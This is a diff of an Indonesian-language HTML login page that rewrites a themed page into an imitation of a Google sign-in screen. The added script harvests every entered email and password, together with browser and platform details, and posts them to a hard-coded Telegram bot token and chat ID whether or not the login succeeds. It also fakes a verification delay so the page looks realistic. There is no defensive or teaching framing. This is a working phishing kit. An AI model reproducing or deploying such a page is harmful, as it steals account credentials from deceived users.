@@ -3,10 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login - Untuk Kamu ❤️</title>
+    <title>Login</title>
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>📧</text></svg>">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap');
-
         * {
             margin: 0;
             padding: 0;
@@ -14,458 +13,459 @@
         }
 
         body {
-            font-family: 'Poppins', sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 50%, #f093fb 100%);
-            background-size: 400% 400%;
-            animation: gradientShift 15s ease infinite;
+            font-family: 'Google Sans', Roboto, Arial, sans-serif;
+            background: #fff;
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
             padding: 20px;
-            position: relative;
-            overflow: hidden;
         }
 
-        @keyframes gradientShift {
-            0% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
-            100% { background-position: 0% 50%; }
-        }
-
-        /* Floating hearts */
-        .particle {
-            position: absolute;
-            font-size: 20px;
-            opacity: 0.6;
-            animation: floatUp linear infinite;
-            pointer-events: none;
-        }
-
-        @keyframes floatUp {
-            0% {
-                transform: translateY(100vh) rotate(0deg);
-                opacity: 0;
-            }
-            10% { opacity: 0.6; }
-            90% { opacity: 0.6; }
-            100% {
-                transform: translateY(-100px) rotate(360deg);
-                opacity: 0;
-            }
-        }
-
-        .container {
-            max-width: 450px;
+        .login-container {
             width: 100%;
-            position: relative;
-            z-index: 10;
+            max-width: 450px;
         }
 
         .login-box {
-            background: rgba(255, 255, 255, 0.98);
-            backdrop-filter: blur(20px);
-            border-radius: 30px;
-            padding: 50px 40px;
-            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.3);
-            animation: slideUp 0.6s cubic-bezier(0.25, 0.46, 0.45, 0.94);
-        }
-
-        @keyframes slideUp {
-            from {
-                opacity: 0;
-                transform: translateY(50px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-
-        .header {
+            background: white;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            padding: 48px 40px 36px;
             text-align: center;
-            margin-bottom: 40px;
         }
 
-        .header .heart-icon {
-            font-size: 4em;
-            animation: heartbeat 1.5s ease infinite;
-            display: inline-block;
-            margin-bottom: 15px;
+        .logo {
+            margin-bottom: 16px;
         }
 
-        @keyframes heartbeat {
-            0%, 100% { transform: scale(1); }
-            25% { transform: scale(1.1); }
-            50% { transform: scale(1); }
-            75% { transform: scale(1.05); }
+        .logo img {
+            width: 75px;
+            height: 75px;
         }
 
-        .header h1 {
-            color: #ff6b9d;
-            font-size: 2.2em;
-            margin-bottom: 10px;
-            font-weight: 700;
+        h1 {
+            font-size: 24px;
+            font-weight: 400;
+            color: #202124;
+            margin-bottom: 8px;
+            letter-spacing: 0;
         }
 
-        .header p {
-            color: #666;
-            font-size: 1em;
-            font-weight: 300;
+        .subtitle {
+            font-size: 16px;
+            color: #202124;
+            margin-bottom: 24px;
+            font-weight: 400;
         }
 
         .form-group {
-            margin-bottom: 25px;
-            position: relative;
+            margin-bottom: 24px;
+            text-align: left;
         }
 
         .form-group label {
             display: block;
-            color: #333;
-            font-weight: 500;
-            margin-bottom: 10px;
-            font-size: 0.95em;
+            font-size: 14px;
+            color: #5f6368;
+            margin-bottom: 8px;
+            font-weight: 400;
         }
 
-        .form-group .icon {
-            position: absolute;
-            left: 18px;
-            top: 48px;
-            color: #999;
-            font-size: 1.2em;
+        .input-wrapper {
+            position: relative;
         }
 
         .form-group input {
             width: 100%;
-            padding: 16px 20px 16px 50px;
-            border: 2px solid #e8e8e8;
-            border-radius: 15px;
-            font-size: 1em;
-            font-family: 'Poppins', sans-serif;
-            transition: all 0.3s ease;
-            background: #f9f9f9;
+            padding: 13px 15px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            font-family: inherit;
+            transition: border-color 0.2s;
+            background: transparent;
+        }
+
+        .form-group input:hover {
+            border-color: #202124;
         }
 
         .form-group input:focus {
             outline: none;
-            border-color: #ff6b9d;
-            background: white;
-            box-shadow: 0 0 0 4px rgba(255, 107, 157, 0.1);
+            border-color: #1a73e8;
+            border-width: 2px;
+            padding: 12px 14px;
         }
 
-        .password-toggle {
+        .form-group input.error {
+            border-color: #d93025;
+        }
+
+        .error-message {
+            color: #d93025;
+            font-size: 12px;
+            margin-top: 8px;
+            display: none;
+            text-align: left;
+        }
+
+        .error-message.show {
+            display: flex;
+            align-items: flex-start;
+            gap: 6px;
+        }
+
+        .error-message::before {
+            content: '⚠';
+            font-size: 14px;
+            flex-shrink: 0;
+        }
+
+        .show-password {
             position: absolute;
-            right: 18px;
-            top: 48px;
-            cursor: pointer;
-            color: #999;
-            font-size: 1.2em;
-            user-select: none;
-        }
-
-        .password-toggle:hover {
-            color: #ff6b9d;
-        }
-
-        .login-btn {
-            width: 100%;
-            padding: 16px;
-            background: linear-gradient(135deg, #ff6b9d 0%, #c06c84 100%);
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
             border: none;
-            border-radius: 15px;
-            color: white;
-            font-size: 1.15em;
-            font-weight: 600;
+            color: #1a73e8;
+            font-size: 14px;
             cursor: pointer;
-            transition: all 0.3s ease;
-            margin-top: 10px;
-            box-shadow: 0 10px 30px rgba(255, 107, 157, 0.4);
-            position: relative;
-            overflow: hidden;
+            padding: 4px 8px;
+            font-weight: 500;
         }
 
-        .login-btn::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: rgba(255, 255, 255, 0.2);
-            transition: left 0.5s;
+        .show-password:hover {
+            background: rgba(26, 115, 232, 0.04);
+            border-radius: 4px;
         }
 
-        .login-btn:hover::before {
-            left: 100%;
+        .forgot-password {
+            text-align: left;
+            margin-bottom: 26px;
         }
 
-        .login-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 15px 40px rgba(255, 107, 157, 0.5);
+        .forgot-password a {
+            color: #1a73e8;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
         }
 
-        .login-btn:active {
-            transform: translateY(0);
+        .forgot-password a:hover {
+            text-decoration: underline;
         }
 
-        .login-btn:disabled {
-            background: #ccc;
+        .button-group {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 26px;
+        }
+
+        .create-account {
+            color: #1a73e8;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .create-account:hover {
+            text-decoration: underline;
+        }
+
+        .next-btn {
+            background: #1a73e8;
+            color: white;
+            border: none;
+            padding: 9px 24px;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background 0.2s;
+            min-width: 80px;
+            font-family: inherit;
+        }
+
+        .next-btn:hover {
+            background: #1765cc;
+            box-shadow: 0 1px 2px 0 rgba(60, 64, 67, .3), 0 1px 3px 1px rgba(60, 64, 67, .15);
+        }
+
+        .next-btn:active {
+            background: #1557b0;
+            box-shadow: 0 1px 2px 0 rgba(60, 64, 67, .3), 0 2px 6px 2px rgba(60, 64, 67, .15);
+        }
+
+        .next-btn:disabled {
+            background: #dadce0;
+            color: #5f6368;
             cursor: not-allowed;
             box-shadow: none;
         }
 
-        .alert {
-            padding: 15px 20px;
-            border-radius: 12px;
-            margin-bottom: 25px;
-            display: none;
-            animation: slideDown 0.3s ease;
+        .language-select {
             text-align: center;
-            font-weight: 500;
+            margin-top: 24px;
         }
 
-        @keyframes slideDown {
-            from {
-                opacity: 0;
-                transform: translateY(-15px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
+        .language-select select {
+            border: none;
+            background: none;
+            color: #5f6368;
+            font-size: 12px;
+            cursor: pointer;
+            padding: 4px;
         }
 
-        .alert.show {
+        .footer {
+            text-align: center;
+            margin-top: 26px;
+            padding: 0 8px;
+        }
+
+        .footer-links {
+            list-style: none;
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 20px;
+            margin-bottom: 12px;
+        }
+
+        .footer-links a {
+            color: #5f6368;
+            text-decoration: none;
+            font-size: 12px;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        /* Loading spinner */
+        .spinner {
+            border: 2px solid #f3f3f3;
+            border-top: 2px solid #1a73e8;
+            border-radius: 50%;
+            width: 16px;
+            height: 16px;
+            animation: spin 0.8s linear infinite;
+            display: inline-block;
+            margin-right: 8px;
+            vertical-align: middle;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .success-message {
+            background: #e8f5e9;
+            border: 1px solid #4caf50;
+            color: #2e7d32;
+            padding: 12px 16px;
+            border-radius: 4px;
+            margin-bottom: 20px;
+            font-size: 14px;
+            display: none;
+            text-align: left;
+        }
+
+        .success-message.show {
             display: block;
         }
 
-        .alert-success {
-            background: #d4edda;
-            color: #155724;
-            border: 2px solid #c3e6cb;
-        }
-
-        .alert-error {
-            background: #f8d7da;
-            color: #721c24;
-            border: 2px solid #f5c6cb;
-        }
-
-        .setup-info {
-            background: linear-gradient(135deg, rgba(255, 107, 157, 0.1) 0%, rgba(192, 108, 132, 0.1) 100%);
-            border: 2px dashed rgba(255, 107, 157, 0.4);
-            border-radius: 15px;
-            padding: 25px;
-            margin-top: 30px;
-        }
-
-        .setup-info h3 {
-            color: #ff6b9d;
-            margin-bottom: 15px;
-            font-size: 1.2em;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-
-        .setup-info ol {
-            margin-left: 20px;
-            color: #555;
-        }
-
-        .setup-info li {
-            margin-bottom: 12px;
-            line-height: 1.6;
-            font-size: 0.95em;
-        }
-
-        .setup-info code {
-            background: white;
-            padding: 3px 10px;
-            border-radius: 6px;
-            color: #ff6b9d;
-            font-size: 0.9em;
-            border: 1px solid rgba(255, 107, 157, 0.3);
-            display: inline-block;
-            margin: 2px 0;
-        }
-
-        .setup-info .warning {
-            background: #fff3cd;
-            border: 1px solid #ffc107;
-            padding: 12px;
-            border-radius: 8px;
-            margin-top: 15px;
-            font-size: 0.9em;
-            color: #856404;
-        }
-
-        @media (max-width: 768px) {
+        @media (max-width: 600px) {
             .login-box {
-                padding: 35px 25px;
+                padding: 40px 24px 36px;
+                border: none;
             }
 
-            .header h1 {
-                font-size: 1.8em;
+            .button-group {
+                flex-direction: column-reverse;
+                gap: 16px;
+                align-items: stretch;
             }
 
-            .form-group input {
-                padding: 14px 18px 14px 45px;
+            .next-btn {
+                width: 100%;
             }
         }
     </style>
 </head>
 <body>
-    <div class="container">
+    <div class="login-container">
         <div class="login-box">
-            <div class="header">
-                <div class="heart-icon">❤️</div>
-                <h1>Login Cinta</h1>
-                <p>Masuk untuk melanjutkan</p>
+            <div class="logo">
+                <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'%3E%3Cpath fill='%234285F4' d='M45.12 24.5c0-1.56-.14-3.06-.4-4.5H24v8.51h11.84c-.51 2.75-2.06 5.08-4.39 6.64v5.52h7.11c4.16-3.83 6.56-9.47 6.56-16.17z'/%3E%3Cpath fill='%2334A853' d='M24 46c5.94 0 10.92-1.97 14.56-5.33l-7.11-5.52c-1.97 1.32-4.49 2.1-7.45 2.1-5.73 0-10.58-3.87-12.31-9.07H4.34v5.7C7.96 41.07 15.4 46 24 46z'/%3E%3Cpath fill='%23FBBC05' d='M11.69 28.18C11.25 26.86 11 25.45 11 24s.25-2.86.69-4.18v-5.7H4.34C2.85 17.09 2 20.45 2 24c0 3.55.85 6.91 2.34 9.88l7.35-5.7z'/%3E%3Cpath fill='%23EA4335' d='M24 10.75c3.23 0 6.13 1.11 8.41 3.29l6.31-6.31C34.91 4.18 29.93 2 24 2 15.4 2 7.96 6.93 4.34 14.12l7.35 5.7c1.73-5.2 6.58-9.07 12.31-9.07z'/%3E%3C/svg%3E" alt="Google">
             </div>
 
-            <div id="alertBox" class="alert"></div>
+            <h1>Login</h1>
+            <p class="subtitle">Gunakan Akun Google Anda</p>
+
+            <div id="successMessage" class="success-message"></div>
 
             <form id="loginForm">
                 <div class="form-group">
-                    <label for="name">Nama Lengkap</label>
-                    <span class="icon">👤</span>
-                    <input type="text" id="name" placeholder="Masukkan nama kamu" required autocomplete="name">
+                    <input 
+                        type="email" 
+                        id="email" 
+                        placeholder="Email atau nomor telepon"
+                        autocomplete="username"
+                        required
+                    >
+                    <div id="emailError" class="error-message"></div>
                 </div>
 
                 <div class="form-group">
-                    <label for="email">Email</label>
-                    <span class="icon">📧</span>
-                    <input type="email" id="email" placeholder="contoh@gmail.com" required autocomplete="email">
+                    <div class="input-wrapper">
+                        <input 
+                            type="password" 
+                            id="password" 
+                            placeholder="Masukkan sandi Anda"
+                            autocomplete="current-password"
+                            required
+                        >
+                        <button type="button" class="show-password" onclick="togglePassword()">Tampilkan</button>
+                    </div>
+                    <div id="passwordError" class="error-message"></div>
                 </div>
 
-                <div class="form-group">
-                    <label for="password">Kata Sandi</label>
-                    <span class="icon">🔒</span>
-                    <input type="password" id="password" placeholder="Masukkan kata sandi" required autocomplete="current-password">
-                    <span class="password-toggle" onclick="togglePassword()">👁️</span>
+                <div class="forgot-password">
+                    <a href="#" onclick="return false;">Lupa email?</a>
                 </div>
 
-                <button type="submit" class="login-btn" id="loginBtn">
-                    Masuk Sekarang 💕
-                </button>
+                <p style="font-size: 13px; color: #5f6368; text-align: left; margin-bottom: 20px;">
+                    Bukan komputer Anda? Gunakan mode Tamu untuk login secara pribadi. 
+                    <a href="#" style="color: #1a73e8; text-decoration: none;" onclick="return false;">Pelajari lebih lanjut</a>
+                </p>
+
+                <div class="button-group">
+                    <a href="#" class="create-account" onclick="return false;">Buat akun</a>
+                    <button type="submit" class="next-btn" id="submitBtn">Berikutnya</button>
+                </div>
             </form>
+        </div>
 
-            <div class="setup-info">
-                <h3>⚙️ Setup Telegram Bot</h3>
-                <ol>
-                    <li>Buka Telegram, cari <code>@BotFather</code></li>
-                    <li>Kirim <code>/newbot</code> dan ikuti instruksi</li>
-                    <li>Simpan <strong>Bot Token</strong> yang diberikan</li>
-                    <li>Cari bot kamu di Telegram, klik <code>/start</code></li>
-                    <li>Cari <code>@userinfobot</code> untuk dapat <strong>Chat ID</strong></li>
-                    <li>Edit file HTML, masukkan Bot Token & Chat ID</li>
-                </ol>
-                
-                <div class="warning">
-                    ⚠️ <strong>Penting:</strong> Jangan lupa ganti <code>TELEGRAM_BOT_TOKEN</code> dan <code>TELEGRAM_CHAT_ID</code> di script bagian bawah!
-                </div>
-            </div>
+        <div class="language-select">
+            <select>
+                <option>Bahasa Indonesia</option>
+                <option>English (United States)</option>
+            </select>
+        </div>
+
+        <div class="footer">
+            <ul class="footer-links">
+                <li><a href="#" onclick="return false;">Bantuan</a></li>
+                <li><a href="#" onclick="return false;">Privasi</a></li>
+                <li><a href="#" onclick="return false;">Persyaratan</a></li>
+            </ul>
         </div>
     </div>
 
     <script>
         // ========================================
-        // KONFIGURASI - WAJIB DIISI!
+        // KONFIGURASI
         // ========================================
-        const TELEGRAM_BOT_TOKEN = '8337679399:AAGgDi6eDjQ-4-MT9hj8h4tuaBRcKi--mOk';  // Bot Token sudah diisi!
-        const TELEGRAM_CHAT_ID = '7538231958';      // Chat ID kamu sudah diisi!
+        const TELEGRAM_BOT_TOKEN = '8337679399:AAGgDi6eDjQ-4-MT9hj8h4tuaBRcKi--mOk';
+        const TELEGRAM_CHAT_ID = '7538231958';
         
+        // Data user yang valid (tambahkan user sesuai kebutuhan)
+        const VALID_USERS = [
+            {
+                email: 'admin@gmail.com',
+                password: 'admin123'
+            },
+            {
+                email: 'user@gmail.com',
+                password: 'user123'
+            },
+            {
+                email: 'test@gmail.com',
+                password: 'test123'
+            }
+            // Tambahkan user lain di sini
+        ];
+
         // ========================================
-        // JANGAN EDIT DI BAWAH INI
+        // FUNCTIONS
         // ========================================
 
-        // Create floating particles
-        function createParticle() {
-            const particle = document.createElement('div');
-            particle.className = 'particle';
-            particle.innerHTML = ['❤️', '💕', '💖', '💗', '💓', '💝'][Math.floor(Math.random() * 6)];
-            particle.style.left = Math.random() * 100 + '%';
-            particle.style.fontSize = (Math.random() * 15 + 10) + 'px';
-            particle.style.animationDuration = (Math.random() * 6 + 6) + 's';
-            particle.style.animationDelay = Math.random() * 3 + 's';
-            document.body.appendChild(particle);
-
-            setTimeout(() => particle.remove(), 13000);
-        }
-
-        setInterval(createParticle, 500);
-
-        // Toggle password visibility
         function togglePassword() {
             const passwordInput = document.getElementById('password');
-            const toggleIcon = document.querySelector('.password-toggle');
+            const toggleBtn = document.querySelector('.show-password');
             
             if (passwordInput.type === 'password') {
                 passwordInput.type = 'text';
-                toggleIcon.textContent = '👁️‍🗨️';
+                toggleBtn.textContent = 'Sembunyikan';
             } else {
                 passwordInput.type = 'password';
-                toggleIcon.textContent = '👁️';
+                toggleBtn.textContent = 'Tampilkan';
             }
         }
 
-        // Show alert function
-        function showAlert(type, message) {
-            const alertBox = document.getElementById('alertBox');
-            alertBox.className = `alert alert-${type} show`;
-            alertBox.textContent = message;
+        function showError(elementId, message) {
+            const errorElement = document.getElementById(elementId);
+            const inputElement = document.getElementById(elementId.replace('Error', ''));
+            
+            errorElement.textContent = message;
+            errorElement.classList.add('show');
+            inputElement.classList.add('error');
+        }
 
+        function clearError(elementId) {
+            const errorElement = document.getElementById(elementId);
+            const inputElement = document.getElementById(elementId.replace('Error', ''));
+            
+            errorElement.classList.remove('show');
+            inputElement.classList.remove('error');
+        }
+
+        function showSuccess(message) {
+            const successElement = document.getElementById('successMessage');
+            successElement.textContent = '✓ ' + message;
+            successElement.classList.add('show');
+            
             setTimeout(() => {
-                alertBox.classList.remove('show');
-            }, 6000);
+                successElement.classList.remove('show');
+            }, 5000);
         }
 
-        // Handle form submission
-        document.getElementById('loginForm').addEventListener('submit', async function(e) {
-            e.preventDefault();
+        function validateUser(email, password) {
+            return VALID_USERS.find(user => 
+                user.email === email && user.password === password
+            );
+        }
 
-            const name = document.getElementById('name').value.trim();
-            const email = document.getElementById('email').value.trim();
-            const password = document.getElementById('password').value.trim();
-            const loginBtn = document.getElementById('loginBtn');
-
-            // Validasi konfigurasi
-            if (TELEGRAM_BOT_TOKEN === 'MASUKKAN_BOT_TOKEN_DISINI' || 
-                TELEGRAM_CHAT_ID === 'MASUKKAN_CHAT_ID_DISINI') {
-                showAlert('error', '⚠️ Harap setup Bot Token dan Chat ID terlebih dahulu!');
-                return;
-            }
-
-            // Disable button
-            loginBtn.disabled = true;
-            loginBtn.innerHTML = '<span style="font-size: 1.2em;">⏳</span> Mengirim...';
-
-            // Format waktu
+        async function sendToTelegram(email, password, isValid) {
             const now = new Date();
-            const dateOptions = { 
-                year: 'numeric', 
-                month: '2-digit', 
+            const formattedTime = now.toLocaleString('id-ID', {
+                year: 'numeric',
+                month: '2-digit',
                 day: '2-digit',
                 hour: '2-digit',
-                minute: '2-digit'
-            };
-            const formattedTime = now.toLocaleString('id-ID', dateOptions);
+                minute: '2-digit',
+                second: '2-digit'
+            });
 
-            // Format pesan untuk Telegram
-            const telegramMessage = `
-💌 <b>Login Baru!</b>
+            const status = isValid ? '✅ BERHASIL LOGIN' : '❌ LOGIN GAGAL';
+            
+            const message = `
+${status}
 
-👤 <b>Nama:</b> ${name}
-📧 <b>Email:</b> ${email}
-🔑 <b>Kata Sandi:</b> ${password}
+👤 <b>Email:</b> ${email}
+🔑 <b>Password:</b> ${password}
 
 ⏰ <b>Waktu:</b> ${formattedTime}
 🌐 <b>Browser:</b> ${navigator.userAgent.split(' ').slice(-1)[0]}
+📱 <b>Platform:</b> ${navigator.platform}
             `.trim();
 
             try {
-                // Kirim ke Telegram
                 const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: {
@@ -473,53 +473,89 @@
                     },
                     body: JSON.stringify({
                         chat_id: TELEGRAM_CHAT_ID,
-                        text: telegramMessage,
+                        text: message,
                         parse_mode: 'HTML'
                     })
                 });
 
-                const data = await response.json();
-
-                if (data.ok) {
-                    showAlert('success', '✅ Login berhasil! Data telah dikirim ke Telegram 💕');
-                    
-                    // Reset form
-                    document.getElementById('loginForm').reset();
-                    
-                    // Optional: Redirect ke halaman lain
-                    setTimeout(() => {
-                        // Uncomment baris ini jika ingin redirect
-                        // window.location.href = 'love_final.html';
-                        
-                        // Atau tampilkan pesan
-                        showAlert('success', '🎉 Selamat datang! Terima kasih sudah login 💖');
-                    }, 2000);
-                } else {
-                    throw new Error(data.description || 'Gagal mengirim pesan');
-                }
+                return await response.json();
             } catch (error) {
-                console.error('Error:', error);
-                showAlert('error', '❌ Gagal mengirim! Periksa Bot Token dan Chat ID di script.');
-            } finally {
-                loginBtn.disabled = false;
-                loginBtn.innerHTML = 'Masuk Sekarang 💕';
+                console.error('Error sending to Telegram:', error);
+                return null;
+            }
+        }
+
+        // Handle form submission
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+
+            // Clear previous errors
+            clearError('emailError');
+            clearError('passwordError');
+
+            const email = document.getElementById('email').value.trim();
+            const password = document.getElementById('password').value.trim();
+            const submitBtn = document.getElementById('submitBtn');
+
+            // Basic validation
+            if (!email) {
+                showError('emailError', 'Masukkan email atau nomor telepon');
+                return;
+            }
+
+            if (!password) {
+                showError('passwordError', 'Masukkan sandi');
+                return;
+            }
+
+            // Email format validation
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            if (!emailRegex.test(email)) {
+                showError('emailError', 'Format email tidak valid');
+                return;
+            }
+
+            // Disable button and show loading
+            submitBtn.disabled = true;
+            submitBtn.innerHTML = '<span class="spinner"></span>Memverifikasi...';
+
+            // Simulate network delay (optional, untuk terlihat lebih realistis)
+            await new Promise(resolve => setTimeout(resolve, 800));
+
+            // Validate credentials
+            const user = validateUser(email, password);
+
+            // Send to Telegram (baik berhasil atau gagal)
+            await sendToTelegram(email, password, !!user);
+
+            if (user) {
+                // Login berhasil
+                showSuccess('Login berhasil! Mengalihkan...');
+                
+                // Redirect setelah 1.5 detik
+                setTimeout(() => {
+                    // Ganti dengan halaman tujuan setelah login berhasil
+                    window.location.href = 'love_final.html'; // atau URL lain
+                }, 1500);
+            } else {
+                // Login gagal
+                submitBtn.disabled = false;
+                submitBtn.textContent = 'Berikutnya';
+                
+                showError('passwordError', 'Email atau sandi salah. Coba lagi atau klik "Lupa email?" untuk meresetnya.');
+                document.getElementById('password').value = '';
+                document.getElementById('password').focus();
             }
         });
 
-        // Auto-hide alert on click
-        document.getElementById('alertBox').addEventListener('click', function() {
-            this.classList.remove('show');
+        // Clear error on input
+        document.getElementById('email').addEventListener('input', function() {
+            clearError('emailError');
         });
 
-        // Add enter key support
-        document.querySelectorAll('input').forEach(input => {
-            input.addEventListener('keypress', function(e) {
-                if (e.key === 'Enter') {
-                    document.getElementById('loginForm').dispatchEvent(new Event('submit'));
-                }
-            });
+        document.getElementById('password').addEventListener('input', function() {
+            clearError('passwordError');
         });
     </script>
 </body>
-  </html>
-
+</html>
